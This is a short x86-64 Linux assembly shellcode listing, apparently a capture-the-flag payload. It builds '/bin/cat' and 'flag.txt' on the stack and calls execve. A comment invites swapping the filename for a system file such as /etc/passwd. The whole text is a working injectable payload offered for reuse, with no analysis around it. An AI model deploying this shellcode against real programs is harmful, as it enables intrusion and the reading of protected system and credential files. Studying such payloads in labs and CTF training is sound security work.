global  _start
section .text
_start:

xor     rax, rax
push    rax
mov     rax, 0x7478742E67616C66 ;txt.galf <--- modify this line to get something like /etc/password, don't fortget to do it in reverse!
push    rax
mov     rcx, rsp
xor     rax, rax
push    rax
mov     rax, 0x7461632F6E69622F ;tac/nib/
push    rax
mov     rdi, rsp
xor     rax, rax
push    rax
push    rcx
push    rdi
mov     rsi, rsp
mov     al, 0x3b
syscall
